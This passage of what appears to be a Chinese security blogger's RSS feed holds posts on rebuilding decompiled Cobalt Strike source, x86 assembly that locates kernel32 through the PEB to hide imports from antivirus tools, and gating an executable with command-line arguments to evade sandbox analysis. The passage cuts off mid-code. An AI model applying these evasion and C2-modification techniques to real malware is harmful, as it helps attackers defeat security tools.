ʷ 修饰字母小写 W&lt;br /&gt;
ʸ 修饰字母小写 Y&lt;br /&gt;
ʰ 修饰字母小写 H&lt;br /&gt;
ʱ 带钩的修饰字母小写 H&lt;br /&gt;
ʲ 修饰字母小写 J&lt;br /&gt;
ʳ 修饰字母小写 R&lt;br /&gt;
ˡ 修饰字母小写 L&lt;br /&gt;
ˢ 修饰字母小写 S&lt;br /&gt;
ˣ 修饰字母小写 X&lt;br /&gt;
 这个不太行，适用性太窄&lt;/p&gt;
&lt;p&gt;这也是我突发奇想试了将近半个多小时试出来总结出来的，结果上网一查早就有大佬总结好了 (emo 了～) 贴个链接把 ==&amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvbmV0d29yay8yOTEwMjAuaHRtbA==&#34;&gt;https://www.freebuf.com/articles/network/291020.html&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://shut-td.github.io/%E6%BA%90%E7%A0%81%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8F%8A%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98-CS%E4%BA%8C%E5%BC%80%E7%B3%BB%E5%88%97/</guid>
            <title>源码反编译及搭建问题[CS二开系列]</title>
            <link>https://shut-td.github.io/%E6%BA%90%E7%A0%81%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8F%8A%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98-CS%E4%BA%8C%E5%BC%80%E7%B3%BB%E5%88%97/</link>
            <category term="安全工具开发" scheme="https://shut-td.github.io/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/" />
            <category term="安全工具开发" scheme="https://shut-td.github.io/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/" />
            <pubDate>Mon, 01 Apr 2024 02:35:14 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;源码的反编译及搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#源码的反编译及搭建&#34;&gt;#&lt;/a&gt; 源码的反编译及搭建&lt;/h3&gt;
&lt;p&gt;我这里使用的是 jadx 进行的反编译，因此后面会有一些代码上的坑需要注意一下。&lt;br /&gt;
新建如下图的目录结构，并将原始的 CSjar 包放进 cs_bin 即可。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hoaqyt5couj30me04874r.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用 jadx 反编译完后导出为 graddle 项目至 cs_src 目录中即可获取源码即下图两个文件夹。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hoar1cl14pj30m8036mxd.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;然后打开 IDEA 新建一个空项目并新建一个 decompiled_src 目录，并将 source 目录复制入 decompiled_src 即可，后续操作参考这篇&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzM3ODUzMy5odG1s&#34;&gt;二开搭建&lt;/span&gt;的文章。&lt;/p&gt;
&lt;p&gt;在这里主要讲下可能是 jadx 反编译的问题导致的反编译后的源代码有些地方会出错需要手动更正一下，这里举几个例子：&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hoar8i6pgnj30mv0a0wg6.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
这里报错的原型是这段代码：&lt;br /&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (Map.Entry entry : &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.hooks.entrySet())&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	.......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 这里只需要跟进 &lt;code&gt;this.hooks.entrySet()&lt;/code&gt;  观察一下返回的类型是什么即可，比如这里跟进之后发现是个 Set 集合，在外面用 Set 集合封装一下在替换即可解决报错，需要注意的是泛型要对齐，再比如下图也是这样。&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hoar8n7oogj30m20553ze.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;还有一种报错就是属性报错，跟进那个类里看一下最接近的属性是什么改成什么就行了，还有包括一些明显的逻辑上的错误比如从外面接了参数却使用另一个赋值为空的参数去比较：&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hoarg84tvzj30xq09s3zo.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
错误原型为第二行多加了 &lt;code&gt;String text2 = &amp;quot;&amp;quot;&lt;/code&gt; ，并在 &lt;code&gt;sum += text.charAt(x)&lt;/code&gt;  这段代码变成了 &lt;code&gt;sum += text2.charAt(x)&lt;/code&gt;  修正过来即可，反正这类逻辑上的代码问题还是稍微注意一下就行。&lt;/p&gt;
&lt;p&gt;至此环境基本搭建完成，可以启动 Agressor 端进行相关例如 UI 的修改以及相关功能的二开了&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://shut-td.github.io/%E8%87%AA%E6%88%91%E5%AE%9A%E4%BD%8D-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B-To-Future/</guid>
            <title>自我定位 &amp; 未来展望 To Future~</title>
            <link>https://shut-td.github.io/%E8%87%AA%E6%88%91%E5%AE%9A%E4%BD%8D-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B-To-Future/</link>
            <pubDate>Fri, 15 Mar 2024 13:24:48 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;自我定位&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自我定位&#34;&gt;#&lt;/a&gt; 自我定位&lt;/h3&gt;
&lt;p&gt;不多说上图&lt;br /&gt;
&lt;img data-src=&#34;//dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hnrmbqbnrvj30q40q475r.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目前算是多方面发育吧，正在学习有关内核、驱动、逆向以及代审有关的知识。&lt;/li&gt;
&lt;li&gt;现在的想法主要还是朝着代码审计和安全开发走吧，目标暂时就是试着二开或者直接自研一整套 C2，审一审比较大的开源框架吧。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;未来展望-to-future~&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#未来展望-to-future~&#34;&gt;#&lt;/a&gt; 未来展望 To Future~&lt;/h3&gt;
&lt;p&gt;可能更想去安全研究 / 实验室 / 攻防的岗位吧🙌&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://shut-td.github.io/%E6%84%8F%E5%A4%96%E7%9A%84Kernel32%E5%9F%BA%E5%9D%80%E5%AF%BB%E5%9D%80/</guid>
            <title>意外的Kernel32基址寻址</title>
            <link>https://shut-td.github.io/%E6%84%8F%E5%A4%96%E7%9A%84Kernel32%E5%9F%BA%E5%9D%80%E5%AF%BB%E5%9D%80/</link>
            <category term="Pwn" scheme="https://shut-td.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" />
            <category term="Pwn" scheme="https://shut-td.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" />
            <pubDate>Fri, 15 Mar 2024 11:03:18 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;在PE文件结构中有个十分重要的东西，也是杀软进行静态分析时常死盯着的，那就是我们的导入表(Import Directory)，内含了该文件运行时调用的DLL文件以及导出函数。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnrid6mj92j31cx0tmgu8.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;如果我们编写脚本时使用Windows库内自带的API，那么这些DLL文件以及包含在内的导出函数便会一览无余得暴露出来，所以我们需要将这些都隐藏掉实现导入表隐藏。如何实现最重要的一步就是通过PEB找到我们的Kernel32基址。
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;windbg调试中遇到的问题与解决&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windbg调试中遇到的问题与解决&#34;&gt;#&lt;/a&gt; Windbg 调试中遇到的问题与解决&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Windbg的使用及安装教程网上资料很多就不多说了，主要提一下在调试时遇到的几个问题。
1、在附加进程时出现错误，先尝试以管理员权限启动Windbg再附加，若仍然报错则直接File-&amp;gt;Open Executable File直接启动任意一个可执行文件也是可以进行调试的，和附加是一样的。
2、调试过程中发生错误 Symbol _PEB 不存在等等之类的，在符号搜索路径(Symbol File Path Search)中添加路径：SRV*c:\mysymbol* http://msdl.microsoft.com/download/symbols 即可。
3、查询至InloadOrderMudleList中的Flink，Blink双向链表时其地址为 ??? ，这是操作系统对内核数据结构的保护进行的隐藏，我分别在Win10，Win10(虚拟机)，Win11三台机器上操作发现只有Win10(虚拟机)进行了字段隐藏，只显示 ???，这个问题我也不知道怎么解决，看情况应该是只有虚拟机会出现，还望懂的大佬能帮一手。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hnriy3p62qj30pf0a4q3t.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnrjm8yshdj30nq09y409.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;kernel32基址寻址的两条路线&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kernel32基址寻址的两条路线&#34;&gt;#&lt;/a&gt; Kernel32 基址寻址的两条路线&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;如何使用Windbg在PEB寻找到kernel32基址这里不展开说了有很多相关的文章可以看，这里主要的内容是我在调试寻址过程中发现的一些问题。
第一条路线：这是最常见的一条即通过InloadOrderMudleList:Flink这条链一直往下跟就能找到Kernel32的DllBase，汇编代码：
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;figure class=&#34;highlight x86asm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;fs&lt;/span&gt;:[&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;]     //找PEB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x0c&lt;/span&gt;]  //获取Ldr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x0c&lt;/span&gt;]  //获取InloadOrderMudleList:Flink&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;]         //获取InloadOrderLinks:Flink =&amp;gt; xxx&lt;span class=&#34;number&#34;&gt;.&lt;/span&gt;exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;]         //获取InloadOrderLinks:Flink =&amp;gt; ntdll&lt;span class=&#34;number&#34;&gt;.&lt;/span&gt;dll&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;]  //获取kernel32 DLLBase也就是基地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; dwKernel32Addr, &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 第二条路线：在最先开始研究的时候我以为这条路线就是第一条路线，但随着调试的过程中发现这地址不对啊！我还以为是操作系统造成的区别导致地址不一，但是我运行了这两段代码都成功指向同一个地址也就是我们的 Kernel32 的基址&lt;br /&gt;
 &lt;figure class=&#34;highlight x86asm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;fs&lt;/span&gt;: [&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;]      //找到PEB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x0c&lt;/span&gt;]    //找LDR&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;]    //InMemoryOrderModuleList:Flink&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;]           //InLoadOrderLinks:&lt;span class=&#34;string&#34;&gt;&amp;quot;shellcode.exe&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;]           //InLoadOrderLinks:&lt;span class=&#34;string&#34;&gt;&amp;quot;ntdll.dll&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;]    //InInitializationOrderLinks:Flink =&amp;gt; DllBase&lt;span class=&#34;string&#34;&gt;&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; dwKernel32Addr, &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 仔细观察上述两段寻址汇编会发现除了获取 Ldr 内的 MudleList 不同和最后不同，其他找的步骤都是一样，那我们看看两条路线在 Windbg 中最后分别是什么&lt;br /&gt;
&lt;img data-src=&#34;//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnrkh9hfh8j30yy07twgy.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnrkhb2uquj30wn07vdhu.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;可以很明显看到这两个字段都指向了0x76fd0000，但是后面为什么InInitializationOrderLinks:Flink的地址就是Kernel32基址而不是DLLBase呢？根据网上众多资料收集来的信息来看可能是因为版本的原因造成的，其真正的基址需要在DllBase的地址上回滚8个字节(也就是图中从 0x18 ==&amp;gt; 0x10)，所以才变成了Flink的地址。其中Ldr内三个模块都能找到Kernel32基址(除了上述两条还有InInitializationOrderModuleList)，只不过现在只有第一条路线是不需要回滚字节的。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hnrkqcctmbj30x30cftbx.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;至于要回滚字节的背后的底层原因我也不是很清楚，还请知道的大佬教教～～&lt;/strong&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://shut-td.github.io/%E7%BB%99EXE%E4%B8%8A%E9%94%81/</guid>
            <title>给EXE上锁</title>
            <link>https://shut-td.github.io/%E7%BB%99EXE%E4%B8%8A%E9%94%81/</link>
            <category term="免杀" scheme="https://shut-td.github.io/categories/%E5%85%8D%E6%9D%80/" />
            <category term="免杀" scheme="https://shut-td.github.io/tags/%E5%85%8D%E6%9D%80/" />
            <pubDate>Thu, 14 Mar 2024 18:15:25 +0800</pubDate>
            <description><![CDATA[ &lt;pre&gt;&lt;code&gt;在免杀中我们常常会用各种加密手段将shellcode进行变形以达到绕过杀软的静态检测分析，比如说最常见的异或，base64编码，aes，rsa，ecc等，当然静态查杀并不是我们主要要解决的，因为静态查杀是最容易绕过的基本上用异或就可以解决，今天我们的主题是绕过杀软的动态查杀。
先说说我认为的杀软查杀恶意文件的方法吧，第一种就是静态查杀，只通过搜索其有无恶意软件的静态特征进行查杀，这种是最容易绕过的基本上对恶意代码进行简单的变形就可以绕过了；第二种就是动态查杀，即用一个沙箱去模拟执行你的文件看是否会执行到某些敏感操作上去；第三种是内存查杀和行为监控，这也是最为难绕过的，因为不管你shellcode在执行前是什么样的加载到内存中去就会现出原形从而被检查到，还有在你去执行命令时不可避免的会向外联地址发送数据，这其中的流量特征也是难以更改的因此很容易被捕捉到，这也就是有些我们可以上线但一执行命令就寄了的原因。
好，简单叙述完查杀原因，我们来步入今天的主题，如何轻松绕过第二种查杀。首先也是最为重要的一点，那就是我们的exe文件后面是可以跟参数的，举个例子：
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;参数个数：%d&amp;quot;&lt;/span&gt;, argc);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;第几个参数：%s-%s&amp;quot;&lt;/span&gt;, argv[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;], argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;pause&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;img data-src=&#34;//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp2u9hz3j30vp0pjwfe.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;可以看到输出的参数，其中 argc 是命令行中参数个数 (包括了这个文件名)，其中 argv 中存储的是命令行中所有的参数。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp2wjah4j30vn0plq4a.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;既然可以跟参数取参数，那我们就可以像设置密码一样控制程序的流程，从而绕过某些检测机制。&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Hello&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello 